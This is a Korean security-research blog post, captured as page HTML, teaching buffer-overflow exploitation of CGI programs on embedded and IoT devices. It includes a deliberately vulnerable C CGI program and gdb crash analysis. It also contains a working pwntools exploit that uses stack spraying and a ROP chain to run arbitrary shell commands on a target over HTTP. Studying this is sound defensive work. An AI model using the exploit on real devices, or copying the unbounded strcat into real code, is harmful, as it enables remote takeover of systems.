p.append(&quot;ss=&quot;+spray) return &quot;&amp;&quot;.join(p) def payload(r11, lr, dummy_len=54): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): # If we already got spray buffer, use it. global spray_fix if len(spray_fix): return spray_fix # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # abort rop += &quot;AAAA&quot;*7 + purl32(abort) # Forming spray. spray = &#39;a&#39; * (SPRAY_LEN % EADDR_LEN) # padd spray += purl32(sled_1) * (((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop # Fix the spray buffer. spray_fix = spray return spray def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\\n\\n\\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) while True: stack = 0xbefe1dd4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) r = p.recv() p.close() if r.find(b&quot;200 OK&quot;) != -1: break log.info(&quot;Success!&quot;) if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 3): exploit(sys.argv[1], sys.argv[2]) else: print(&quot;{} [target-ip] [shell command]&quot;.format(sys.argv[0])) 끝내면서 CGI를 공격하는 방법에 대해 알아보았습니다. 일반적으로 웹 CGI 프로그램 혹은 CGI는 문자열을 처리하는 코드가 많습니다. 문자열을 처리하는 코드에서 주로 발생할 수 있는 String copy buffer overflow의 공격 방법에 대해 알아보았고, 안정적인 공격 코드를 작성하는 법에 대해 알아 보았습니다. 추가적인 질문 사항과 수정사항은 dhkim@stealien.com으로 남겨 주시면 감사하겠습니다. https://www.lighttpd.net/ &#8617; CGI Environment Variables &#8617; strcat &#8617; Buffer overflow &#8617; Return oriented programming &#8617;","mainEntityOfPage":{"@type":"WebPage","@id":"http://ufo.stealien.com/2020-08-20/cgi_exploit"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name=“naver-site-verification” content=“74a9ec74d48a1ffca92bf9ac4704ba73be9afd65" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous"/>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<link rel="stylesheet" href="/assets/css/style.css">

<link href="https://fonts.googleapis.com/css2?family=Nanum+Gothic:wght@400;700;800&display=swap" rel="stylesheet">

<link rel="stylesheet" href="/id//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/default.min.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>

<link href="/assets/css/syntax.css" rel="stylesheet" >


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-06FFJEF76M"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-06FFJEF76M');
</script>
</head>
<body>
	<header>
		<div class="container"></div><div id="header">
    <div class="container" style="display: flex;justify-content: space-between;">
        <a href="/id/">
            <img
                class="header_image_logo"
                src="/assets/logo.png"
                style="width: 140px; margin: 20px 28px 0px;"
            />
        </a>
        <a href="https://www.stealien.com/" target="_blank" style="font-family: 'NotoSansKR Medium', sans-serif;font-size: 14px;margin-right: 30px; color: #000; line-height: 70px;">스틸리언 홈페이지</a>
    </div>
</div>
</header>
	<section>
		<div>
			<div class="header_image_bg header_image_post" style="background-image: url('/assets/bg.png');">
    <div class="header_image_post_body">
        <div class="container">
            <div class="page-category">R&D</div>
            <div class="page-title">Common ways to exploit CGI Buffer overflow.</div>
            <div class="page-summary">
                <div style="float:left;">
                    <img class="page-profile_image" src="/assets/stealien_inverse.png" />
                    <span>김도현</span>
                </div>
                <div style="float:right;" class="page-date">Aug 20, 2020</div>
            </div>
        </div>
    </div>
</div>
<div class="container page-content">
    <h1 id="common-ways-to-exploit-cgi-buffer-overflow">Common ways to exploit CGI Buffer overflow.</h1>

<p>다양한 임베디드 서비스 및 IoT에서 사용되는 CGI 프로그램을 공격하는 일반적인 방법에 대해 알아 보겠습니다.</p>

<h2 id="common-gateway-interface">Common Gateway Interface</h2>

<p>CGI는 웹 서버상에서 사용자 프로그램을 동작시키기 위한 조합입니다. 존재하는 많은 웹 서버 프로그램은 CGI의 기능을 이용할 수 있습니다. CGI는 환경변수나 표준입출력을 다룰 수 있는 프로그램 언어에서라면 언어의 구별을 묻지 않고 확장하여 이용하는 것이 가능하나, 실행속도나 텍스트 처리의 용이함 등의 균형에 의해 펄이 사용되는 경우가 많았습니다.[^1]</p>

<p>CGI는 주로 Router, NAS와 같은 다양한 Embedded device, IoT Service를 위해 사용됩니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                | Server
                |
+--------+      |       +-------------+       +-------------+
| Client |&lt;=---HTTP---=&gt;| HTTP Server |&lt;=---=&gt;| CGI Program |
+--------+      |       +-------------+       +-------------+
                |
                |
</code></pre></div></div>

<h3 id="cgi-how-to">CGI: How-to</h3>

<p>Lighttpd<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">1</a></sup>와 같이 HTTP 프로토콜을 처리하여 CGI 프로그램으로 전달 할 수 있는 웹 서버 역할을 하는 프로그램을 한가지 선정합니다. 그 후에 CGI 규약에 맞게 프로그램을 작성하면 됩니다. 본 챕터에서는 공격하기 위해 알아야하는 몇가지를 설명하겠습니다.</p>

<h4 id="환경변수">환경변수</h4>

<p>환경변수에는 HTTP 프로토콜을 통해 클라이언트에게 제공받은 정보가 저장됩니다.</p>

<p>임의로 변조된 사용자의 값이 전달 될 수 있는 벡터는 다음과 같습니다.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">2</a></sup></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">HTTP_COOKIE</code> : 클라이언트의 Cookie입니다.</li>
  <li><code class="language-plaintext highlighter-rouge">HTTP_USER_AGENT</code> : 클라이언트의 User agent입니다.</li>
  <li><code class="language-plaintext highlighter-rouge">QUERY_STRING</code> : 클라이언트에게 제공받은 <code class="language-plaintext highlighter-rouge">GET</code> 쿼리 문자열입니다.</li>
</ul>

<h4 id="표준입출력">표준입출력</h4>

<p>표준 출력을 통해 cgi 페이지로 접근한 클라이언트에게 그 내용을 전달할 수 있습니다.</p>

<p><code class="language-plaintext highlighter-rouge">POST</code>와 같은 HTTP Method를 서비스 하기 위해 CGI에서는 표준입력을 사용합니다. <code class="language-plaintext highlighter-rouge">POST</code>의 데이터를 전달 받기 위해서는 단순히 표준입력을 받기만 하면 우리는 <code class="language-plaintext highlighter-rouge">POST</code>를 통해 전달 된 데이터를 받아낼 수 있습니다.</p>

<h2 id="cgi-공격">CGI 공격</h2>

<p><strong>vuln.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">param</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">param_count</span><span class="p">;</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">char</span> <span class="nf">h2c</span><span class="p">(</span><span class="kt">char</span> <span class="n">h</span><span class="p">)</span> <span class="c1">// F -&gt; 15</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">h</span> <span class="o">&gt;=</span> <span class="sc">'a'</span> <span class="o">&amp;&amp;</span> <span class="n">h</span> <span class="o">&lt;=</span> <span class="sc">'f'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">h</span> <span class="o">-</span> <span class="sc">'a'</span> <span class="o">+</span> <span class="mh">0xa</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">h</span> <span class="o">&gt;=</span> <span class="sc">'A'</span> <span class="o">&amp;&amp;</span> <span class="n">h</span> <span class="o">&lt;=</span> <span class="sc">'F'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">h</span> <span class="o">-</span> <span class="sc">'A'</span> <span class="o">+</span> <span class="mh">0xa</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">h</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="nf">u2c</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">u</span><span class="p">)</span> <span class="c1">// %00 -&gt; \x00</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">u</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="n">h2c</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">u</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">;</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="n">h2c</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">u</span><span class="o">+</span><span class="mi">2</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x01</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">urldecode</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">index1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">index2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'?'</span><span class="p">)</span>
        <span class="n">index2</span><span class="o">++</span><span class="p">;</span>

    <span class="n">param</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
    <span class="n">param_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">])</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">s</span><span class="p">[</span><span class="n">index1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">u2c</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="n">index2</span><span class="p">);</span>
            <span class="n">index2</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'&amp;'</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">s</span><span class="p">[</span><span class="n">index1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
            <span class="n">index2</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'='</span><span class="p">)</span>
                <span class="n">param_count</span><span class="o">++</span><span class="p">;</span>
            <span class="n">s</span><span class="p">[</span><span class="n">index1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="o">++</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">s</span><span class="p">[</span><span class="n">index1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">get_val</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">param_c</span> <span class="o">=</span> <span class="n">param</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">param_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_c</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">name_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">param</span> <span class="o">||</span> <span class="o">!</span><span class="n">param_count</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"no query.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">param_count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">param_c</span><span class="p">,</span> <span class="n">name_len</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">param_c</span><span class="p">[</span><span class="n">name_len</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'='</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">param_c</span> <span class="o">+=</span> <span class="n">name_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">strncpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">param_c</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
            <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">param_c</span> <span class="o">+=</span> <span class="n">param_len</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
            <span class="n">param_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_c</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">urldecode</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">"QUERY_STRING"</span><span class="p">)))</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"urldecode error.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">get_val</span><span class="p">(</span><span class="s">"time"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">)</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"echo '- time ------' &gt;&gt; /tmp/out &amp;&amp; date &gt;&gt; /tmp/out;"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">get_val</span><span class="p">(</span><span class="s">"ifconfig"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">)</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"echo '- ifconfig --' &gt;&gt; /tmp/out &amp;&amp; ifconfig bond0 &gt;&gt; /tmp/out;"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">get_val</span><span class="p">(</span><span class="s">"uname"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">)</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"echo '- uname -----' &gt;&gt; /tmp/out &amp;&amp; uname -a &gt;&gt; /tmp/out;"</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"rm -f /tmp/out"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/tmp/out"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">get_val</span><span class="p">(</span><span class="s">"comment"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">))</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위 샘플 코드는 시스템의 <code class="language-plaintext highlighter-rouge">time</code>, <code class="language-plaintext highlighter-rouge">ifconfig</code>, <code class="language-plaintext highlighter-rouge">uname</code>의 결과값을 출력 해 주는 간단한 프로그램입니다.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">L109</code>
<code class="language-plaintext highlighter-rouge">QUERY_STRING</code>을 통해 인풋 받는 <code class="language-plaintext highlighter-rouge">GET</code> Query의 디코딩을 처리합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L119~124</code>
<code class="language-plaintext highlighter-rouge">time</code>, <code class="language-plaintext highlighter-rouge">ifconfig</code>, <code class="language-plaintext highlighter-rouge">uname</code>을 실행하는 명령어 조합을 <code class="language-plaintext highlighter-rouge">cmd</code> 버퍼에 복사합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L126~127</code>
<code class="language-plaintext highlighter-rouge">/tmp/out</code>을 삭제 후 <code class="language-plaintext highlighter-rouge">cmd</code> 버퍼의 내용대로 명령어를 실행합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L129~133</code>
<code class="language-plaintext highlighter-rouge">/tmp/out</code> 파일을 읽어 <code class="language-plaintext highlighter-rouge">out</code>버퍼에 복사합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L135~136</code>
<code class="language-plaintext highlighter-rouge">comment</code> 의 값이 유효할 경우 그 값을 <code class="language-plaintext highlighter-rouge">out</code> 버퍼에 복사합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L138</code>
<code class="language-plaintext highlighter-rouge">out</code>을 출력합니다.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">L136</code>에서 <code class="language-plaintext highlighter-rouge">strncat</code> 대신 <code class="language-plaintext highlighter-rouge">strcat</code><sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">3</a></sup>을 사용하기 때문에, <code class="language-plaintext highlighter-rouge">out</code> 버퍼에 이미 많은 양의 데이터가 채워져 있을 경우의 예외를 처리하지 않습니다. 이로 인해 Buffer overflow<sup id="fnref:5" role="doc-noteref"><a href="#fn:5" class="footnote" rel="footnote">4</a></sup>가 발생하게 됩니다.</p>

<h3 id="취약점-증명">취약점 증명</h3>

<p>취약점을 증명하기 위해 간단히 웹 브라우저를 사용할 수 있습니다.</p>

<p><img src="/assets/2020-08-20-cgi_exploit.assets/image-20200819160551819.png" alt="image-20200819160551819" /></p>

<p>위는 정상적인 프로그램의 실행 흐름을 나타냅니다.</p>

<p><img src="/assets/2020-08-20-cgi_exploit.assets/image-20200819160732064.png" alt="image-20200819160732064" /></p>

<p>위는 다수의 데이터를 <code class="language-plaintext highlighter-rouge">comment</code> 파라미터를 통해 전달 할 경우를 보여줍니다.</p>

<p>Lighttpd의 경우 다음과 같이 core dump를 활성화 시킬 수 있습니다. cgi 프로그램이 존재하는 디렉토리에 core dump가 생성됩니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo 'server.core-files = "enable"' &gt;&gt; /etc/lighttpd.conf
$ kill -9 `pidof lighttpd`
$ lighttpd -f /etc/lighttpd.conf -m /usr/local/lib
</code></pre></div></div>

<p>그 후, 해당 프로그램의 core dump를 확인합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/314ckC47 # ./gdb -q -c /path/to/core
[New LWP 6007]
Core was generated by `vuln.cgi'.
Program terminated with signal 11, Segmentation fault.
#0  0x61616160 in ?? ()
(gdb) i r pc
pc             0x61616160       0x61616160
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">$pc</code> 레지스터가 변조 된 것을 알 수 있습니다.</p>

<h3 id="공격-제약">공격 제약</h3>

<p>일반적인 BOF 공격은 Return Oriented Programming(ROP)<sup id="fnref:6" role="doc-noteref"><a href="#fn:6" class="footnote" rel="footnote">5</a></sup>을 주로 사용합니다.</p>

<p>하지만 이번 취약점을 공격하기에는 몇가지 제약이 있습니다.</p>

<ul>
  <li>문자열 복사를 통해 발생하는 Buffer overflow이기 때문에, ROP Payload에 Null byte가 포함 될 경우 성공적으로 공격을 수행할 수 없습니다.</li>
  <li>공격에 사용할 수 있는 정적인 주소가 프로그램(vuln.cgi)이 로드 된 지점밖에 없습니다.</li>
  <li>프로그램이 로드 된 주소값의 상위 1바이트는 Null-byte입니다.</li>
</ul>

<p>이런 상황에서 구상할 수 있는 Payload는 다음과 같습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;= 0x00000000                       0xffffffff =&gt;
+-----+-(out)---------------+-(BP)-+-(PC)-+-----+
| ... | ............ 'a'*63 | BASE | JUMP | ... |
+-----+---------------------+------+------+-----+
                      === Overflow ==&gt;
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">JUMP</code>에는 상위 1바이트가 Null-byte인 주소값을 삽입할 수 있습니다.</li>
  <li><code class="language-plaintext highlighter-rouge">BASE</code>에는 Null-byte가 존재하지 않는 어떤 값을 삽입할 수 있습니다.</li>
</ul>

<p>이런 모든 조건을 종합 해 보았을 때, 우리는 다음과 같이 공격을 구상해야합니다.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">PC</code>를 단 한번 변조하여 공격자가 원하는 코드의 흐름을 획득 해야합니다.
    <ul>
      <li>연속적인 함수의 호출 또는 인자의 구성을 위해 Null-byte를 삽입할 수 있는 영역이 필요합니다.</li>
      <li>연속적인 함수의 호출 또는 인자의 구성을 위해 <code class="language-plaintext highlighter-rouge">SP</code>를 변조할 수 있어야 합니다.</li>
    </ul>
  </li>
</ul>

<h3 id="stack-spray">Stack spray</h3>

<p><code class="language-plaintext highlighter-rouge">QUERY_STRING</code> 환경변수는 스택에 저장되어 있습니다. 이를 활용하면 다음과 같이 Stack spray를 시도 할 수 있습니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">):</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="s">""</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"GET http://{}/vuln.cgi?{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Host: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Connection: keep-alive</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Content-Length: 0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"User-Agent: Mozilla/5.0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept: */*</span><span class="se">\r\n</span><span class="s">"</span>
